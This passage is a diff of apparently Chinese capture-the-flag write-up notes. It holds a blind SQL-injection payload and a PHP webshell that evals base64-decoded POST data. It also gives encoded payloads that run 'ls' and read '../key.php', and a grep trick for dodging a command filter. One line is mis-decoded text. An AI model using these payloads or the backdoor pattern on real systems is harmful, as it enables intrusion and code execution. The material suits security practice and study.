@@ -1119,3 +1119,41 @@ id=1'+and+substr((select+*+from+hazel.fl4g),§1§,1)%3d'§1§'%23
 ```
 hazel{8c4c152d-1aa9-4991-8aac-951ca6e3efa0}
 ```
+[嘤嘤嘤]P1_1
+base64加密注入，爆字段数找回显点（让他的不成立）不要用and，页面也不会回显错误，错误就不显示结果
+[嘤嘤嘤]P1_2
+[嘤嘤嘤]P1_3
+```
+<?php
+
+@$a = $_POST['Hello'];
+
+if(isset($a)){
+
+@preg_replace("/\[(.*)\]/e",'\\1',base64_decode('W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10='));
+
+}
+
+?>
+
+Hello
+
+<br>
+
+閫忚繃鐜拌薄鐪嬫湰璐紝涓栫晫寰堢畝鍗曪紒
+
+W0BldmFsKGJhc2U2NF9kZWNvZGUoJF9QT1NUW3owXSkpO10=
+
+[@eval(base64_decode($_POST[z0]));]
+
+z0=system('ls'); --> z0=c3lzdGVtKCdscycpOw==
+
+Hello=12312321&z0=c3lzdGVtKCdscycpOw==
+
+Hello=12312321&z0=c3lzdGVtKCd0YWMgLi4va2V5LnBocCcpOw==
+```
+[嘤嘤嘤]P1_4
+命令执行，
+过滤了cat head tail cp mv vi vim
+使用grep '\*' ../flag拿flag
+[嘤嘤嘤]P1_5
